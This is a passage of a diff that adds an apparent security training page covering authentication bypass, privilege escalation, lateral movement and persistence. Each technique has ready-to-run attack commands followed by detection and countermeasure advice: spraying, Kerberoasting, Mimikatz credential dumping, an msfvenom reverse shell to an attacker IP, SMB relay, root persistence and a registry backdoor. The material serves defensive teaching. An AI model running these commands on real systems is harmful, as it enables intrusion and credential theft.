+  <li><strong>MFA fatigue:</strong> Send repeated approval requests until a user accepts one.</li>
+  <li><strong>Key techniques:</strong> Replay attacks, token theft, phishing for one-time codes, and Kerberoasting.</li>
+</ul>
+
+<h3>Adversarial Examples: Phase 4 — Authentication Bypass &amp; Identity Theft</h3>
+
+<div class="reminder" style="margin-top: 15px;">
+  <strong>⚠️ Threat Intelligence Context:</strong> The following examples represent 
+  real-world adversary tradecraft observed in enterprise intrusions. They are 
+  documented here for defensive analysis and detection engineering in authorized 
+  environments only.
+</div>
+
+<h3>Example 4.1: Credential Stuffing &amp; Password Spraying</h3>
+
+<p><strong>Adversary Objective:</strong> Obtain initial access by exploiting weak or reused credentials without triggering account lockouts.</p>
+
+<p>An adversary harvests usernames from LinkedIn, company email conventions, or prior breach dumps. Instead of brute-forcing a single account (which risks lockout), they spray one common password across many accounts during a narrow window.</p>
+
+<pre><code><span style="color:#4CAF50;"># Spray a single password against many domain accounts via SMB</span>
+netexec smb &lt;target&gt; -u usernames.txt -p '&lt;password&gt;' --continue-on-success
+
+<span style="color:#4CAF50;"># Target an exposed HTTP login portal with Hydra</span>
+hydra -L usernames.txt -P passwords.txt &lt;target&gt; http-post-form \
+  "/login:user=^USER^&amp;pass=^PASS^:F=Invalid"
+
+<span style="color:#4CAF50;"># Brute-force a known local admin account over SSH</span>
+hydra -l &lt;user&gt; -P passwords.txt ssh://&lt;target&gt;</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Password spraying exploits weak password hygiene 
+  and avoids lockout thresholds by distributing attempts across many identities. 
+  Credential stuffing replays passwords leaked from third-party breaches.
+  <strong>Detection opportunities:</strong> Multiple failed logons (Event ID 4625) 
+  across disparate usernames from a single source; impossible travel; successful 
+  logons immediately following a spray pattern.
+</div>
+
+<h3>Example 4.2: Kerberoasting</h3>
+
+<p><strong>Adversary Objective:</strong> Extract service account credentials from Active Directory by requesting crackable Kerberos TGS tickets.</p>
+
+<p>With any valid domain account, an adversary queries LDAP for Service Principal Names (SPNs). Each SPN represents an account running a service. The adversary requests a TGS ticket for each SPN, which is encrypted with the service account's password. Offline cracking of this ticket reveals the plaintext password.</p>
+
+<pre><code><span style="color:#4CAF50;"># Enumerate SPNs and request TGS tickets</span>
+GetUserSPNs.py &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;' -request -outputfile kerberoast.txt
+
+<span style="color:#4CAF50;"># Crack the exported TGS tickets (Hashcat mode 13100)</span>
+hashcat -m 13100 kerberoast.txt -a 0 wordlist.txt --show</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Kerberoasting attacks service accounts, which 
+  often have weak passwords and rarely expire. RC4-encrypted tickets are fastest 
+  to crack offline.
+  <strong>Detection opportunities:</strong> Monitor Event ID 4769 for unusual 
+  TGS requests, especially from non-service hosts; enforce AES encryption for 
+  service accounts; use group Managed Service Accounts (gMSA) with automatic 
+  password rotation.
+</div>
+
+<h3>Example 4.3: AS-REP Roasting</h3>
+
+<p><strong>Adversary Objective:</strong> Abuse accounts that have "Do not require Kerberos preauthentication" enabled to harvest crackable AS-REP hashes without needing any prior credentials.</p>
+
+<p>When preauthentication is disabled, anyone can request an AS-REP encrypted with the user's password hash. The adversary requests this ticket and cracks it offline.</p>
+
+<pre><code><span style="color:#4CAF50;"># Enumerate accounts without pre-auth and extract hashes</span>
+GetNPUsers.py &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;' -dc-ip &lt;dc-ip&gt; -request
+
+<span style="color:#4CAF50;"># Crack AS-REP hashes (Hashcat mode 18200)</span>
+hashcat -m 18200 asrep_hashes.txt -a 0 wordlist.txt --show</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> AS-REP roasting requires no valid credentials 
+  to initiate against misconfigured accounts. It is a silent enumeration technique 
+  that leaves only a single AS-REQ/AS-REP event.
+  <strong>Detection opportunities:</strong> Audit for user accounts with 
+  <code>Do not require Kerberos preauthentication</code> enabled; monitor Event ID 
+  4625 and 4768 anomalies; enable preauthentication domain-wide.
+</div>
+
+<h3>Example 4.4: Session Hijacking &amp; Fixation</h3>
+
+<p><strong>Adversary Objective:</strong> Bypass authentication entirely by stealing or fixing an active session token.</p>
+
+<p>An adversary positioned on the network captures unencrypted HTTP traffic containing session cookies. Alternatively, they inject a known session ID via XSS or URL parameters before the victim authenticates, fixing the session to an ID the adversary controls.</p>
+
+<pre><code><span style="color:#4CAF50;"># Intercept session cookies from plaintext HTTP</span>
+tcpdump -i eth0 -A port 80 | grep -E "Cookie:|Set-Cookie:"
+
+<span style="color:#4CAF50;"># Reuse a stolen session cookie to access a protected dashboard</span>
+curl --cookie "session=&lt;stolen_token&gt;" http://&lt;target&gt;/dashboard
+
+<span style="color:#4CAF50;"># Session fixation: force a victim to use a known session ID</span>
+curl --cookie "PHPSESSID=&lt;attacker_session_id&gt;" http://&lt;target&gt;/login</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Session hijacking allows an adversary to 
+  impersonate a user without credentials. Session fixation forces the victim 
+  to bind their authenticated session to a token known in advance by the attacker.
+  <strong>Detection opportunities:</strong> Enforce HTTPS/HSTS; use Secure, 
+  HttpOnly, SameSite cookies; implement session rotation after authentication; 
+  monitor for concurrent sessions from disparate geolocations.
+</div>
+
+<h3>Example 4.5: MFA Fatigue &amp; Phishing for OTPs</h3>
+
+<p><strong>Adversary Objective:</strong> Bypass multi-factor authentication by either exhausting the target's attention or proxying the login in real time.</p>
+
+<p>Against push-based MFA (Microsoft Authenticator, Duo, etc.), an adversary initiates dozens of authentication requests in rapid succession. The target, annoyed or confused, eventually approves one. Alternatively, the adversary deploys an adversary-in-the-middle (AiTM) proxy (e.g., Evilginx, Muraena) that harvests both the password and the time-based OTP in real time before forwarding them to the legitimate service.</p>
+
+<pre><code><span style="color:#4CAF50;"># Adversary-in-the-Middle: Proxy a legitimate Okta login portal</span>
+evilginx phishlets-host &lt;phishlet&gt; &lt;attacker-ip&gt;
+evilginx lure-generate &lt;phishlet&gt;
+
+<span style="color:#4CAF50;"># Replay a stolen TOTP code before it expires</span>
+curl -X POST https://&lt;target&gt;/api/mfa_verify \
+  -H "Content-Type: application/json" \
+  -d '{"username":"&lt;user&gt;","mfa_code":"&lt;otp&gt;"}'</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> MFA is not authentication perfection. Push 
+  fatigue exploits human psychology; AiTM proxies defeat time-based OTP by 
+  relaying it within the validity window.
+  <strong>Detection opportunities:</strong> Monitor for multiple MFA push 
+  notifications from a single source; deploy number matching or phishing-resistant 
+  FIDO2/WebAuthn tokens; flag rapid sequential logins with identical device 
+  fingerprints.
+</div>
+
+<h3>Example 4.6: Pass-the-Hash (PtH) &amp; Pass-the-Ticket (PtT)</h3>
+
+<p><strong>Adversary Objective:</strong> Authenticate to remote systems using stolen credential material without ever recovering the plaintext password.</p>
+
+<p>From LSASS memory, an adversary extracts NTLM hashes or Kerberos tickets. Rather than cracking them, the adversary injects the hash or ticket directly into a new process to authenticate laterally.</p>
+
+<pre><code><span style="color:#4CAF50;"># Extract hashes from LSASS memory using Mimikatz</span>
+mimikatz # sekurlsa::logonpasswords
+
+<span style="color:#4CAF50;"># Pass-the-Hash: authenticate using the raw NTLM hash</span>
+netexec smb &lt;target&gt; -u &lt;user&gt; -H &lt;ntlm_hash&gt;
+psexec.py &lt;domain&gt;/&lt;user&gt;@&lt;target&gt; -hashes &lt;hash&gt;
+
+<span style="color:#4CAF50;"># Pass-the-Ticket: inject a stolen Kerberos TGT into the current session</span>
+mimikatz # sekurlsa::tickets /export
+mimikatz # kerberos::ptt [0;123456]@krbtgt-&lt;domain&gt;.kirbi
+
+<span style="color:#4CAF50;"># Access resources using the injected ticket</span>
+dir \\&lt;domain_controller&gt;\C$</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> PtH and PtT are the backbone of lateral 
+  movement in Windows environments. NTLM hashes and Kerberos tickets are 
+  cryptographic equivalents of passwords in many protocols.
+  <strong>Detection opportunities:</strong> Monitor Event IDs 4624 (logon type 3) 
+  and 4768/4769 for anomalous NTLM/Kerberos usage; implement Windows Credential 
+  Guard to isolate LSASS; restrict lateral movement via local administrator 
+  password solution (LAPS) and Privileged Access Workstations (PAW).
+</div>
+
+<h3>Blue Team: Defensive Countermeasures</h3>
+
+<p><strong>Objective:</strong> Detect, disrupt, and recover from authentication-focused attacks.</p>
+
+<p><strong>Detection Rules &amp; Monitoring</strong></p>
+
+<pre><code><span style="color:#4CAF50;"># Detect multiple failed logons indicative of password spraying</span>
+Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4625]]" |
+    Group-Object -Property {$_.Properties[18].Value} |
+    Where-Object Count -gt 10 |
+    Select-Object Name, Count
+
+<span style="color:#4CAF50;"># Detect Kerberoasting: TGS requests with RC4 encryption</span>
+Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4769]]" |
+    Where-Object { $_.Message -match "Ticket Encryption Type:\s+0x17" }
+
+<span style="color:#4CAF50;"># Detect PtH: NTLM logons where the account has no plaintext presence</span>
+Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]]" |
+    Where-Object { $_.Message -match "Logon Type:\s+3" -and $_.Message -match "NTLM" }</code></pre>
+
+<p><strong>Incident Response: Authentication Breach</strong></p>
+
+<div class="iscsec-table-responsive">
+  <table class="iscsec-table" aria-label="Authentication breach incident response">
+    <thead>
+      <tr>
+        <th>Step</th>
+        <th>Action</th>
+        <th>Tool / Command</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>1. Detect</strong></td>
+        <td>Identify unauthorized authentication attempts and anomalous sessions</td>
+        <td><code>SIEM alerts</code>, <code>Event 4624/4625/4768/4769</code></td>
+      </tr>
+      <tr>
+        <td><strong>2. Contain</strong></td>
+        <td>Disable compromised accounts, revoke sessions, and block source IPs</td>
+        <td><code>net user /active:no</code>, <code>Revoke-AzureADUserAllRefreshToken</code></td>
+      </tr>
+      <tr>
+        <td><strong>3. Investigate</strong></td>
+        <td>Map lateral movement paths and identify credential exposure scope</td>
+        <td><code>Event Log analysis</code>, <code>Kerberos ticket inspection</code></td>
+      </tr>
+      <tr>
+        <td><strong>4. Eradicate</strong></td>
+        <td>Reset passwords and KRBTGT account (twice) to invalidate golden tickets</td>
+        <td><code>Reset-ADServiceAccountPassword</code>, <code>krbtgt reset</code></td>
+      </tr>
+      <tr>
+        <td><strong>5. Recover</strong></td>
+        <td>Restore MFA enrollment and reissue hardware tokens if compromised</td>
+        <td><code>MFA re-enrollment</code>, <code>token reprovisioning</code></td>
+      </tr>
+      <tr>
+        <td><strong>6. Learn</strong></td>
+        <td>Enforce phishing-resistant MFA, implement PAW, and harden service accounts</td>
+        <td><code>FIDO2/WebAuthn</code>, <code>gMSA</code>, <code>Credential Guard</code></td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<p><strong>Additional Defensive Measures</strong></p>
+
+<pre><code><span style="color:#4CAF50;"># Enforce strong password policy and lockout thresholds</span>
+Set-ADDefaultDomainPasswordPolicy -Identity &lt;domain&gt; -MinPasswordLength 14 `
+  -ComplexityEnabled $true -LockoutThreshold 5 -LockoutDuration 00:30:00
+
+<span style="color:#4CAF50;"># Enable Windows Credential Guard (prevents PtH / LSASS dumping)</span>
+<span style="color:#4CAF50;"># Deploy via UEFI lock with Group Policy or the following registry path:</span>
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f
+
+<span style="color:#4CAF50;"># Audit for accounts with Kerberos preauthentication disabled</span>
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |
+    Select-Object SamAccountName</code></pre>
+
+<div class="reminder" style="margin-top: 15px;">
+  <strong>⚠️ Threat Intelligence Disclaimer:</strong> These adversarial examples 
+  are derived from real-world attacker tradecraft and are provided for authorized 
+  security testing, detection engineering, and defensive preparedness only.
+</div>
+
+<div class="adversary-philosophy" style="background: rgba(244,67,54,0.05); border-left: 4px solid #f44336; padding: 18px 24px; margin: 24px 0; border-radius: 4px;">
+  <p style="margin: 0; font-style: italic; color: #cfd8dc;">
+    "Authentication is the first gate an attacker must pass. It doesn’t matter how strong your encryption is or how well you segment your network if an attacker can simply become an authorized user. Defenders must treat every login attempt as potentially hostile and verify every identity, every time."
+  </p>
+</div>
+
+<!-- =========================================== -->
+<!-- PHASE 5                                      -->
+<!-- =========================================== -->
+
+<h3>Phase 5: Authorization Escalation &amp; Lateral Movement (The Expand Vector)</h3>
+<p><strong>Adversarial goal:</strong> Move from low-level access to high-privilege control.</p>
+<ul>
+  <li><strong>Core concept:</strong> Authorization.</li>
+  <li><strong>Privilege escalation:</strong> Exploit bugs or misconfigurations to gain admin, root, or SYSTEM-level access.</li>
+  <li><strong>Lateral movement:</strong> Use compromised credentials to move from one host to another inside the network.</li>
+  <li><strong>Access control misuse:</strong> Abuse permissions granted to a user, group, or service account.</li>
+  <li><strong>Key techniques:</strong> Pass-the-Hash, token manipulation, SMB relaying, and Active Directory group abuse.</li>
+</ul>
+
+<h3>Adversarial Examples: Phase 5 — Authorization Escalation &amp; Lateral Movement</h3>
+
+<div class="reminder" style="margin-top: 15px;">
+  <strong>⚠️ Threat Intelligence Context:</strong> The following examples represent 
+  real-world adversary tradecraft observed in enterprise intrusions. They are 
+  documented here for defensive analysis and detection engineering in authorized 
+  environments only.
+</div>
+
+<h3>Example 5.1: Linux Privilege Escalation via Sudo Misconfiguration</h3>
+
+<p><strong>Adversary Objective:</strong> Escalate from a low-privilege Linux account to root by exploiting misconfigured sudo permissions.</p>
+
+<p>An adversary with interactive shell access enumerates sudo privileges using <code>sudo -l</code> or automated scripts like LinPEAS. If the user is granted NOPASSWD rights over specific binaries, the adversary consults resources such as GTFOBins to execute arbitrary commands in the context of root without ever knowing the root password.</p>
+
+<pre><code><span style="color:#4CAF50;"># Enumerate available sudo privileges</span>
+sudo -l
+
+<span style="color:#4CAF50;"># Automated privilege-escalation enumeration</span>
+./linpeas.sh | tee enum.txt
+
+<span style="color:#4CAF50;"># Abuse via GTFOBins (examples: find, vim, bash)</span>
+sudo find . -exec /bin/bash \; -quit
+sudo vim -c ':!/bin/bash'
+sudo bash
+
+<span style="color:#4CAF50;"># Maintain persistence after escalation</span>
+echo "&lt;user&gt;:x:0:0::/root:/bin/bash" >> /etc/passwd
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> /root/.ssh/authorized_keys</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Sudo misconfigurations are common privilege-escalation 
+  vectors. Adversaries use:
+  <ul>
+    <li><strong>GTFOBins:</strong> Curated database of Unix binaries exploitable for privilege escalation</li>
+    <li><strong>NOPASSWD:</strong> Commands executable without password authentication</li>
+    <li><strong>LinPEAS:</strong> Automated enumeration of weak permissions and misconfigurations</li>
+  </ul>
+  <strong>Detection opportunities:</strong> Audit <code>/etc/sudoers</code> regularly, 
+  restrict sudo to the minimum necessary commands, monitor for unusual sudo execution, 
+  and enforce SELinux/AppArmor profiles.
+</div>
+
+<h3>Example 5.2: Windows Privilege Escalation via Unquoted Service Paths</h3>
+
+<p><strong>Adversary Objective:</strong> Escalate from a low-privilege Windows user to SYSTEM by exploiting unquoted service paths.</p>
+
+<p>When a service binary path contains spaces and is not enclosed in quotes, Windows parses the path left-to-right and executes the first binary it finds. An adversary with write access to an early directory in that path places a malicious executable there, causing the service to run it with SYSTEM privileges on next start.</p>
+
+<pre><code><span style="color:#4CAF50;"># Enumerate unquoted service paths</span>
+wmic service get name,displayname,pathname,startmode | findstr /i /v "\""
+
+<span style="color:#4CAF50;"># Automated enumeration</span>
+.\winPEAS.exe > enum.txt
+
+<span style="color:#4CAF50;"># Check directory write permissions</span>
+icacls "C:\Program Files\&lt;Vendor&gt;"
+
+<span style="color:#4CAF50;"># Generate malicious binary and place it in the unquoted path</span>
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;attacker-ip&gt; LPORT=&lt;port&gt; -f exe -o "Vulnerable.exe"
+copy \\&lt;attacker-ip&gt;\share\Vulnerable.exe "C:\Program Files\&lt;Vendor&gt;\Vulnerable.exe"
+
+<span style="color:#4CAF50;"># Trigger service restart</span>
+sc stop &lt;service&gt;
+sc start &lt;service&gt;</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Unquoted service paths allow arbitrary code 
+  execution at SYSTEM integrity. Adversaries rely on:
+  <ul>
+    <li><strong>wmic / winPEAS:</strong> Enumeration of vulnerable services</li>
+    <li><strong>icacls:</strong> Verifying write access to intermediary directories</li>
+    <li><strong>Service restart:</strong> Triggering execution without a system reboot</li>
+  </ul>
+  <strong>Detection opportunities:</strong> Audit service paths during deployment, 
+  enforce quoted paths, restrict directory permissions, and monitor for service 
+  binary modifications.
+</div>
+
+<h3>Example 5.3: Lateral Movement via SMB Relay</h3>
+
+<p><strong>Adversary Objective:</strong> Authenticate to remote systems by relaying captured NTLM hashes without cracking them.</p>
+
+<p>An adversary positions themselves on the network to capture NTLM challenge-response traffic, then relays those credentials to hosts where SMB signing is disabled. This grants remote code execution or interactive access as the relayed user.</p>
+
+<pre><code><span style="color:#4CAF50;"># Enable IP forwarding</span>
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+<span style="color:#4CAF50;"># Capture authentication attempts</span>
+responder -I eth0 -w -d
+
+<span style="color:#4CAF50;"># Relay captured hashes to a target host</span>
+ntlmrelayx.py -t smb://&lt;target&gt; -smb2support -c "whoami > C:\temp\out.txt"
+
+<span style="color:#4CAF50;"># Interactive SMB shell via relay</span>
+ntlmrelayx.py -t smb://&lt;target&gt; -smb2support -i
+
+<span style="color:#4CAF50;"># Verify execution with relayed credentials</span>
+netexec smb &lt;target&gt; -u &lt;user&gt; -p '' -x "type C:\temp\out.txt"</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> SMB relay attacks exploit the absence of SMB 
+  signing to reuse NTLM credentials in real time. Adversaries use:
+  <ul>
+    <li><strong>Responder:</strong> Forced authentication and hash capture</li>
+    <li><strong>ntlmrelayx.py:</strong> Relay to execute commands or dump secrets</li>
+    <li><strong>SMB signing disabled:</strong> Prerequisite for successful relay</li>
+  </ul>
+  <strong>Detection opportunities:</strong> Enforce SMB signing domain-wide, segment 
+  networks, monitor for anomalous SMB sessions, and detect forced authentication 
+  patterns (LLMNR/NBT-NS poisoning).
+</div>
+
+<h3>Example 5.4: Active Directory Group Abuse</h3>
+
+<p><strong>Adversary Objective:</strong> Escalate privileges by abusing Active Directory group memberships and delegated permissions.</p>
+
+<p>An adversary with any valid domain account enumerates group memberships, identifies nested or delegated rights, and visualizes attack paths. Where write permissions exist against group objects, the adversary adds themselves or a controlled account to a privileged group.</p>
+
+<pre><code><span style="color:#4CAF50;"># Enumerate group memberships with PowerView</span>
+Import-Module PowerView.ps1
+Get-DomainGroupMember -Identity "Domain Admins"
+
+<span style="color:#4CAF50;"># Map attack paths with BloodHound</span>
+.\SharpHound.exe -c All --zipfilename bh_data.zip
+<span style="color:#4CAF50;"># Import bh_data.zip into BloodHound; query shortest paths to Domain Admin</span>
+
+<span style="color:#4CAF50;"># Abuse delegated write permissions</span>
+netexec ldap &lt;dc-ip&gt; -u &lt;user&gt; -p '&lt;password&gt;' -M add_users -o TARGET_GROUP="Domain Admins" TARGET_USER="&lt;user&gt;"</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> AD group abuse is a silent path to total domain 
+  compromise. Adversaries leverage:
+  <ul>
+    <li><strong>BloodHound:</strong> Graph-based visualization of escalation paths</li>
+    <li><strong>PowerView:</strong> Enumeration of groups, ACLs, and trusts</li>
+    <li><strong>Delegated permissions:</strong> Write access to group or user objects</li>
+  </ul>
+  <strong>Detection opportunities:</strong> Monitor Event IDs 4728/4732 for 
+  privileged group modifications, audit AD delegations, implement tiered administration, 
+  and enforce Just-In-Time (JIT) access.
+</div>
+
+<h3>Example 5.5: Lateral Movement via WMI, WinRM, and PsExec</h3>
+
+<p><strong>Adversary Objective:</strong> Move laterally across a Windows environment using built-in remote-management protocols and valid credentials.</p>
+
+<p>With domain or local credentials in hand, an adversary executes commands via WMI, establishes interactive PowerShell sessions over WinRM, or uses PsExec to obtain a SYSTEM-level command shell on a remote host.</p>
+
+<pre><code><span style="color:#4CAF50;"># WMI command execution</span>
+wmiexec.py &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;target&gt;
+netexec smb &lt;target&gt; -u &lt;user&gt; -p '&lt;password&gt;' -x "whoami"
+
+<span style="color:#4CAF50;"># WinRM interactive PowerShell remoting</span>
+evil-winrm -i &lt;target&gt; -u &lt;user&gt; -p '&lt;password&gt;'
+
+<span style="color:#4CAF50;"># PsExec for SYSTEM-level access</span>
+psexec.py &lt;domain&gt;/&lt;user&gt;:'&lt;password&gt;'@&lt;target&gt;</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> WMI, WinRM, and SMB are the highways of lateral 
+  movement. Adversaries use:
+  <ul>
+    <li><strong>wmiexec.py:</strong> Covert command execution via WMI</li>
+    <li><strong>evil-winrm:</strong> Interactive PowerShell remoting</li>
+    <li><strong>psexec.py:</strong> Service-based SYSTEM access</li>
+  </ul>
+  <strong>Detection opportunities:</strong> Enable PowerShell ScriptBlock and Module 
+  logging, monitor WMI activity (Event ID 5859), restrict WinRM to authorized hosts, 
+  and implement Just Enough Administration (JEA).
+</div>
+
+<h3>Example 5.6: Token Manipulation and Impersonation</h3>
+
+<p><strong>Adversary Objective:</strong> Escalate privileges or assume another identity by manipulating Windows access tokens.</p>
+
+<p>Once SYSTEM privileges are obtained, an adversary enumerates tokens of higher-privilege users currently loaded in memory and impersonates them. Alternatively, PowerShell scripts reflectively manipulate tokens to bypass credential re-entry.</p>
+
+<pre><code><span style="color:#4CAF50;"># Enumerate and impersonate tokens with Mimikatz</span>
+mimikatz # privilege::debug
+mimikatz # token::list
+mimikatz # token::impersonate /id:&lt;token_id&gt;
+
+<span style="color:#4CAF50;"># Verify elevated context</span>
+dir \\&lt;domain_controller&gt;\C$
+
+<span style="color:#4CAF50;"># PowerShell token manipulation</span>
+Import-Module .\Invoke-TokenManipulation.ps1
+Invoke-TokenManipulation -Enumerate
+Invoke-TokenManipulation -ImpersonateUser -Username &lt;target_user&gt;</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Token manipulation allows an adversary to become 
+  another user without knowing their password. Adversaries abuse:
+  <ul>
+    <li><strong>SeImpersonatePrivilege:</strong> Required to acquire and impersonate tokens</li>
+    <li><strong>token::impersonate:</strong> Direct impersonation of in-memory identities</li>
+    <li><strong>Invoke-TokenManipulation:</strong> Reflective, in-memory token abuse</li>
+  </ul>
+  <strong>Detection opportunities:</strong> Monitor for token impersonation events, 
+  enable LSA protection, restrict SeImpersonatePrivilege to necessary services, 
+  and use protected users security group.
+</div>
+
+<h3>Example 5.7: Blue Team — Defensive Countermeasures</h3>
+
+<p><strong>Objective:</strong> Detect, disrupt, and recover from authorization breaches and lateral movement.</p>
+
+<p><strong>Detection Rules &amp; Monitoring</strong></p>
+
+<pre><code><span style="color:#4CAF50;"># Detect unauthorized group membership changes</span>
+<span style="color:#4CAF50;"># Event ID 4728 / 4729</span>
+Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4728 or EventID=4729]]" |
+    Where-Object { $_.TimeCreated -gt (Get-Date).AddHours(-24) } |
+    Select-Object TimeCreated, @{N='TargetUser';E={$_.Properties[6].Value}}, @{N='GroupName';E={$_.Properties[7].Value}}
+
+<span style="color:#4CAF50;"># Detect WMI lateral movement</span>
+<span style="color:#4CAF50;"># Event ID 4656</span>
+Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4656]]" |
+    Where-Object { $_.Properties[2].Value -match "WMI" } |
+    Select-Object TimeCreated, @{N='ObjectName';E={$_.Properties[3].Value}}, @{N='SubjectUser';E={$_.Properties[4].Value}}
+
+<span style="color:#4CAF50;"># Detect PowerShell remoting</span>
+<span style="color:#4CAF50;"># Event ID 4103</span>
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4103]]" |
+    Where-Object { $_.Properties[1].Value -match "Enter-PSSession|Invoke-Command" } |
+    Select-Object TimeCreated, @{N='Session';E={$_.Properties[3].Value}}, @{N='Command';E={$_.Properties[4].Value}}</code></pre>
+
+<p><strong>Incident Response: Authorization Breach &amp; Lateral Movement</strong></p>
+
+<div class="iscsec-table-responsive">
+  <table class="iscsec-table" aria-label="Authorization breach incident response">
+    <thead>
+      <tr>
+        <th>Step</th>
+        <th>Action</th>
+        <th>Tool / Command</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>1. Detect</strong></td>
+        <td>Identify unauthorized privilege changes and lateral movement paths</td>
+        <td><code>SIEM alerts</code>, <code>Event 4728/4729 analysis</code></td>
+      </tr>
+      <tr>
+        <td><strong>2. Contain</strong></td>
+        <td>Remove compromised accounts from privileged groups; isolate affected hosts</td>
+        <td><code>net group "Domain Admins" /delete</code></td>
+      </tr>
+      <tr>
+        <td><strong>3. Investigate</strong></td>
+        <td>Map lateral movement paths and identify credential exposure scope</td>
+        <td><code>Event Log correlation</code>, <code>EDR logs</code></td>
+      </tr>
+      <tr>
+        <td><strong>4. Eradicate</strong></td>
+        <td>Close entry points and remove attacker presence</td>
+        <td><code>revoke sessions</code>, <code>patch vulnerabilities</code></td>
+      </tr>
+      <tr>
+        <td><strong>5. Recover</strong></td>
+        <td>Restore normal operations and validate controls</td>
+        <td><code>re-enable accounts</code>, <code>validate AD integrity</code></td>
+      </tr>
+      <tr>
+        <td><strong>6. Learn</strong></td>
+        <td>Update authorization controls and monitoring</td>
+        <td><code>implement JIT</code>, <code>update detection rules</code></td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<p><strong>Additional Defensive Measures</strong></p>
+
+<pre><code><span style="color:#4CAF50;"># Implement Just-In-Time (JIT) access for privileged accounts</span>
+<span style="color:#4CAF50;"># Configure Privileged Access Management (PAM) solutions</span>
+
+<span style="color:#4CAF50;"># Enable SMB signing to prevent SMB relay attacks</span>
+<span style="color:#4CAF50;"># Microsoft network client / server: Digitally sign communications (always) -> Enabled</span>
+
+<span style="color:#4CAF50;"># Enable LSA Protection to prevent LSASS dumping</span>
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
+
+<span style="color:#4CAF50;"># Implement tiered administration model</span>
+<span style="color:#4CAF50;"># Tier 0: Domain Controllers, AD Admin accounts</span>
+<span style="color:#4CAF50;"># Tier 1: Server admins, application servers</span>
+<span style="color:#4CAF50;"># Tier 2: Workstation admins, user workstations</span>
+<span style="color:#4CAF50;"># Restrict logon rights between tiers</span></code></pre>
+
+<div class="reminder" style="margin-top: 15px;">
+  <strong>⚠️ Threat Intelligence Disclaimer:</strong> These adversarial examples 
+  are derived from real-world attacker tradecraft and are provided for authorized 
+  security testing, detection engineering, and defensive preparedness only.
+</div>
+
+<div class="adversary-philosophy" style="background: rgba(244,67,54,0.05); border-left: 4px solid #f44336; padding: 18px 24px; margin: 24px 0; border-radius: 4px;">
+  <p style="margin: 0; font-style: italic; color: #cfd8dc;">
+    "Authorization is the difference between a user and an administrator. Attackers don’t just want access — they want control. Every permission granted, every group membership assigned, and every delegation configured is a potential path to total compromise. Defenders must treat privilege as the crown jewels of security and protect it with the same rigor as data itself."
+  </p>
+</div>
+
+<!-- =========================================== -->
+<!-- PHASE 6                                      -->
+<!-- =========================================== -->
+
+<h3>Phase 6: Persistence &amp; Evasion (The Stay Vector)</h3>
+<p><strong>Adversarial goal:</strong> Maintain access even if the first entry point gets closed or detected.</p>
+<ul>
+  <li><strong>Core concept:</strong> Persistence, with direct impact on accountability and non-repudiation.</li>
+  <li><strong>Backdoors:</strong> Add accounts, scheduled tasks, services, or startup entries to enable re-entry.</li>
+  <li><strong>Rootkits and hooking:</strong> Hide processes, files, or activity from standard operating system tools.</li>
+  <li><strong>Living off the land:</strong> Use built-in tools such as PowerShell, PsExec, WMI, or cron to reduce suspicious file drops.</li>
+  <li><strong>Key techniques:</strong> Registry run keys, cron jobs, DLL side-loading, process injection, and signed binary abuse.</li>
+</ul>
+
+<h3>Adversarial Examples: Phase 6 — Persistence &amp; Evasion</h3>
+
+<div class="reminder" style="margin-top: 15px;">
+  <strong>⚠️ Threat Intelligence Context:</strong> The following examples represent 
+  real-world adversary tradecraft observed in enterprise intrusions. They are 
+  documented here for defensive analysis and detection engineering in authorized 
+  environments only.
+</div>
+
+<h3>Example 6.1: Registry Run Key Persistence</h3>
+
+<p><strong>Adversary Objective:</strong> Maintain user-level or system-level persistence that survives reboots by writing to Windows registry autorun keys.</p>
+
+<p>An adversary adds a malicious entry to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> or <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code> to execute a payload at user login or system startup.</p>
+
+<pre><code><span style="color:#4CAF50;"># User-level persistence (standard user)</span>
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateService /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
+
